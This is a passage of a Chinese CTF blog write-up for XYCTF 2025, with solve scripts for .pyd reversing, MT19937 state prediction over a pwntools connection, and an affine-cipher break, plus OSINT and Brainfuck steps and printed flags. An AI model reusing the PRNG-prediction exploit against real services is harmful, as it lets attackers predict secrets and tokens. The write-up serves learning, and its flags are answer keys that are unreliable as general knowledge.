<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pyd_module</span>(<span class="params">pyd_path</span>):</span><br><span class="line">    module_name = os.path.splitext(os.path.basename(pyd_path))[<span class="number">0</span>]</span><br><span class="line">    spec = importlib.util.spec_from_file_location(module_name, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    <span class="keyword">return</span> module</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_module</span>(<span class="params">module</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 模块名: <span class="subst">&#123;module.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 文档字符串:\n<span class="subst">&#123;module.__doc__&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    members = <span class="built_in">dir</span>(module)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 模块成员列表:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> members:</span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>) <span class="keyword">and</span> name.endswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        attr = <span class="built_in">getattr</span>(module, name)</span><br><span class="line">        <span class="keyword">if</span> inspect.isfunction(attr):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 函数: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            doc = inspect.getdoc(attr)</span><br><span class="line">            <span class="keyword">if</span> doc:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      - Doc: <span class="subst">&#123;doc&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      - Doc: 无&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> inspect.isbuiltin(attr):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 内建函数: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [+] 变量: <span class="subst">&#123;name&#125;</span> = <span class="subst">&#123;<span class="built_in">repr</span>(attr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 替换为你的 .pyd 文件路径</span></span><br><span class="line">    pyd_path = <span class="string">&quot;moon.pyd&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pyd_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 找不到文件: <span class="subst">&#123;pyd_path&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mod = load_pyd_module(pyd_path)</span><br><span class="line">        analyze_module(mod)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 加载或分析模块失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223032-1744002931594-5.png"
                      class=""
                >
<p>再根据前面的分析，写了个解密的脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> moon</span><br><span class="line"></span><br><span class="line">xor_result = moon.xor_crypt(<span class="number">1131796</span>,<span class="string">b&#x27;\x42\x6b\x87\xab\xd0\xce\xaa\x3c\x58\x76\x1b\xbb\x01\x72\x60\x6d\xd8\xab\x06\x44\x91\xa2\xa7\x6a\xf9\xa9\x3e\x1a\xe5\x6f\xa8\x42\x06\xa2\xf7&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>刚开始根据分析以为先传的是16进制</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">b&#x27;\x42\x6b\x87\xab\xd0\xce\xaa\x3c\x58\x76\x1b\xbb\x01\x72\x60\x6d\xd8\xab\x06\x44\x91\xa2\xa7\x6a\xf9\xa9\x3e\x1a\xe5\x6f\xa8\x42\x06\xa2\xf7&#x27;</span>,<span class="number">1131796</span>)</span><br></pre></td></tr></table></figure></div>
<p>结果报错了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095832084.png"
                      class=""
                >
<p>后面换回来就对了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223137-1744002931594-6.png"
                      class=""
                >
<p>得到flag<code>flag&#123;but_y0u_l00k3d_up_@t_th3_mOOn&#125;</code></p>
<h4 id="crypto-division">crypto-Division</h4>
<p>1.稍微搜一下就知道，漏洞在于Python的random模块使用的是MT19937伪随机数生成器，这是一个确定性算法，只要获取足够多的随机数样本,也就是624个32位值，就可以完全预测后续的所有随机数输出。只预测下一个32位的话可看https://blog.csdn.net/qq_57235775/article/details/131168939。</p>
<p>2.这里一开始以为预测11000和10000要用32位去拼，因为不是32的倍数，想尽办法想把这个预测大数的函数写好，问ai也是搞不清楚是截高位还是低位，还有各种掩码什么的，两种都试了结果都不行。最后真的是福至心灵，一开始有在本地测猜后续的32位确认没问题，是用的predictor.getrandbits(32)，那我不自己去用32位拼了，直接用训练好的来predictor.getrandbits(11000)呢？结果还真对了，想复杂了。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.timeout = <span class="number">30</span>  </span><br><span class="line">    <span class="comment"># 远程连接参数</span></span><br><span class="line">    HOST = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">    PORT = <span class="number">44194</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 建立远程连接</span></span><br><span class="line">        proc = remote(HOST, PORT)</span><br><span class="line">        <span class="comment"># 初始化预测器</span></span><br><span class="line">        predictor = MT19937Predictor()</span><br><span class="line">        log.info(<span class="string">&quot;开始收集624个随机数样本...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 收集624个样本</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 发送选项1，分母1</span></span><br><span class="line">                proc.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">                proc.sendlineafter(<span class="string">b&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 接收响应</span></span><br><span class="line">                resp = proc.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">                num = <span class="built_in">int</span>(proc.recvline().strip())</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 训练预测器</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">624</span>:</span><br><span class="line">                    predictor.setrandbits(num, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                    log.info(<span class="string">f&quot;已收集 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span>/624 个样本&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.error(<span class="string">f&quot;收集样本时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">&quot;开始预测大随机数...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 预测随机数</span></span><br><span class="line">        rand1 = predictor.getrandbits(<span class="number">11000</span>)</span><br><span class="line">        rand2 = predictor.getrandbits(<span class="number">10000</span>)</span><br><span class="line">        rand2 = <span class="built_in">max</span>(rand2, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        correct_ans = rand1 // rand2</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">f&quot;rand1位数: <span class="subst">&#123;rand1.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line">        log.info(<span class="string">f&quot;rand2位数: <span class="subst">&#123;rand2.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line">        log.info(<span class="string">f&quot;计算结果: <span class="subst">&#123;correct_ans&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提交答案</span></span><br><span class="line">        proc.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        proc.sendlineafter(<span class="string">b&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(correct_ans).encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 等待flag提示</span></span><br><span class="line">            resp = proc.recvuntil(<span class="string">b&#x27;WOW&#x27;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span> + proc.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            log.success(<span class="string">f&quot;成功获取flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                resp = proc.recvall(timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                    flag = resp[resp.index(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>):]</span><br><span class="line">                    flag = flag[:flag.index(<span class="string">b&#x27;&#125;&#x27;</span>) + <span class="number">1</span>]</span><br><span class="line">                    log.success(<span class="string">f&quot;获取flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.error(<span class="string">&quot;未找到flag，完整响应:&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(resp.decode(errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.error(<span class="string">f&quot;接收错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                log.error(<span class="string">f&quot;最后数据: <span class="subst">&#123;proc.clean().decode(errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;程序出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        proc.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406231907423.png"
                      alt="image-20250406231907423" style="zoom:33%;" 
                ></p>
<p>flag值：XYCTF{64341c34-1e13-47d5-b97c-bc17f7b7fe98}</p>
<h4 id="crypto-reed">crypto-reed</h4>
<p>1.看题目。大概就是用户提供一个种子，使用该种子初始化PRNG生成两个参数a和b，然后使用线性同余加密方式加密flag，(a
* table.index(m) + b) % 19198111。</p>
<p>2.nc上之后可以看到，虽然每次得到的密文组不同，但是固定的几个位置上的数一定是相同的，比如1，2，5...。说明这几个位置上的明文是相同的，如果可以先猜测这些位置上的明文，就可以列方程组解a,b，由此再去解剩余的密文。（说实话是遍历试的明文，代码总是有点问题改了很久，答案出来之后只能说哎，这怎么能没看出来，这相同的位置，这提示，哎）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406232133685.png"
                      alt="image-20250406232133685" style="zoom:50%;" 
                ></p>
<p>3.随便选一组数据来解：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gcd, x, y = extended_gcd(b % a, a)</span><br><span class="line">            <span class="keyword">return</span> gcd, y - (b // a) * x, x</span><br><span class="line"></span><br><span class="line">    gcd, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;a在模m下没有逆&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">cipher, table, m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密cipher&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 找到重复值</span></span><br><span class="line">    repeated = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">set</span>(cipher) <span class="keyword">if</span> cipher.count(c) &gt; <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(repeated) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not enough repeated values to solve&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历可能的重复值组合</span></span><br><span class="line">    <span class="keyword">for</span> c0, c1 <span class="keyword">in</span> combinations(repeated, <span class="number">2</span>):</span><br><span class="line">        pos0 = cipher.index(c0)</span><br><span class="line">        pos1 = cipher.index(c1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历可能的字符组合</span></span><br><span class="line">        <span class="keyword">for</span> m0 <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> m1 <span class="keyword">in</span> table:</span><br><span class="line">                i0 = table.index(m0)</span><br><span class="line">                i1 = table.index(m1)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    a = (c1 - c0) * inverse(i1 - i0, m) % m</span><br><span class="line">                    b = (c0 - a * i0) % m</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 检查a范围</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 解密全部</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    inv_a = inverse(a, m)</span><br><span class="line">                    flag = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">                        idx = ((c - b) * inv_a) % m</span><br><span class="line">                        <span class="keyword">if</span> idx &lt; <span class="number">0</span> <span class="keyword">or</span> idx &gt;= <span class="built_in">len</span>(table):</span><br><span class="line">                            <span class="keyword">raise</span> ValueError</span><br><span class="line">                        flag.append(table[idx])</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Possible flag:&quot;</span>, <span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to decrypt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">m = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试数据</span></span><br><span class="line">cipher = [<span class="number">3554294</span>, <span class="number">3554294</span>, <span class="number">4160781</span>, <span class="number">17161684</span>, <span class="number">3554294</span>, <span class="number">4160781</span>, <span class="number">13048613</span>, <span class="number">13655100</span>, <span class="number">16687535</span>, <span class="number">47710</span>, <span class="number">6244918</span>, <span class="number">8670866</span>, <span class="number">14868074</span>, <span class="number">13655100</span>, <span class="number">1867171</span>, <span class="number">3080145</span>, <span class="number">13655100</span>, <span class="number">9277353</span>, <span class="number">9277353</span>, <span class="number">14868074</span>, <span class="number">6244918</span>, <span class="number">5638431</span>, <span class="number">1867171</span>, <span class="number">6851405</span>, <span class="number">47710</span>, <span class="number">15474561</span>, <span class="number">14868074</span>, <span class="number">16081048</span>, <span class="number">9277353</span>, <span class="number">3554294</span>, <span class="number">11570963</span>, <span class="number">3554294</span>, <span class="number">11570963</span>, <span class="number">17768171</span>, <span class="number">3554294</span>, <span class="number">9751502</span>]</span><br><span class="line">solve(cipher, table, m)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406224335690.png"
                      alt="image-20250406224335690" style="zoom:50%;" 
                ></p>
<p>flag值:XYCTF{114514fixedpointissodangerous1919810}</p>
<h4 id="misc-问卷">misc-问卷</h4>
<p>填写问卷得flag。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407132018172.png"
                      class=""
                >
<p>flag{TH@NK_U!WE_H0P3_Y0U_H@VE_FU7!H@PPY_H<span class="citation"
data-cites="CKING">@CKING</span>!}</p>
<h4 id="misc-xgctf">misc-XGCTF</h4>
<p>1.审题，先去 CTFshow 找一下西瓜杯这场比赛</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213220996-1743954120807-90.png"
                      alt="image-20250406213220996" style="zoom: 50%;" 
                ></p>
<p>2.根据题目 "唯一由 LamentXU 出的题", 点进每道题看看，找到这道题是
easy_polluted</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213409260-1743954120807-91.png"
                      alt="image-20250406213409260" style="zoom:50%;" 
                ></p>
<p>3.为了方便找对应的原题，看看官方 wp，没想到直接给了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213551415-1743954120807-92.png"
                      alt="image-20250406213551415" style="zoom:50%;" 
                ></p>
<p>4.直接搜 CISCN 华东南 WEB 没怎么找到，搜 dragonkeep
什么的也没找到，于是换成搜出题想找到出题人的博客，说不定有更详细的信息。也是很容易就找到了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213723500-1743954120807-93.png"
                      alt="image-20250406213723500" style="zoom:50%;" 
                ></p>
<p>5.进入博客页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406213855060-1743954120807-94.png"
                      alt="image-20250406213855060" style="zoom:50%;" 
                ></p>
<p>6.下翻，左侧可拉开，有搜索功能</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214059696-1743954120807-95.png"
                      alt="image-20250406214059696" style="zoom: 50%;" 
                ></p>
<p>7.损友的话有可能会提到对方的，于是在这里搜索
dragonkeep，确实提到了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214143202-1743954120807-96.png"
                      alt="image-20250406214143202" style="zoom:50%;" 
                ></p>
<p>8.好好好直接给了对方的博客地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214224910-1743954120807-97.png"
                      alt="image-20250406214224910" style="zoom:50%;" 
                ></p>
<p>9.访问该地址，找到历史文章 CISCN 的 WEB，翻下源码搜 flag 就看见了，再
base64 解密即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214613601-1743954120807-98.png"
                      style="zoom:50%;" 
                ></p>
<p><img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214459712-1743953865918-1743954120807-99.png"
                      
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406214519061-1743954120807-100.png"
                      alt="image-20250406214519061" style="zoom:50%;" 
                ></p>
<p>flag 值：flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e<span
class="citation" data-cites="se_fOrg1ve_Me">@se_fOrg1ve_Me</span>}</p>
<h4 id="misc-签个到吧">misc-签个到吧</h4>
<p>1.看一眼附件，挺眼熟的，根据题目内容搜一下，Brainfuck 啊</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215452620-1743953974505-76.png"
                      alt="image-20250406215452620" style="zoom:50%;" 
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215430650-1743953974505-77.png"
                      alt="image-20250406215430650" style="zoom:50%;" 
                ></p>
<p>2.直接尝试用网站一键解密！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215621978-1743953974505-78.png"
                      alt="image-20250406215621978" style="zoom:50%;" 
                ></p>
<p>3.结果一片空白，短一点也是空白。好吧，只能老老实实学一下这个语言规则，稍微了解一下就好</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406215952102-1743953974505-79.png"
                      alt="image-20250406215952102" style="zoom:50%;" 
                ></p>
<p>4.这时候大概能发现这个-+-+-+纯没用，可删，但这应该影响不了最后的结果才对。再用调试工具试一下看是哪出了问题
https://ashupk.github.io/Brainfuck/brainfuck-visualizer-master/index.html</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220311579-1743953974505-80.png"
                      alt="image-20250406220311579" style="zoom:50%;" 
                ></p>
<p>5.发现 []
的乘法做完之后本来都已经到右边的指针又返回来把往左一个的这个数清零。也就是
&lt; [-]
这部分的问题，全局选一下删掉，再运行就能发现每个位置的数都保存好了，按照
ascii 码也大概知道对了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./xyctf2025wp/image-20250406220726360-1743953974506-81.png"
                      alt="image-20250406220726360" style="zoom:50%;" 
                ></p>
<p>6.但是这个运行太慢，就写脚本了</p>
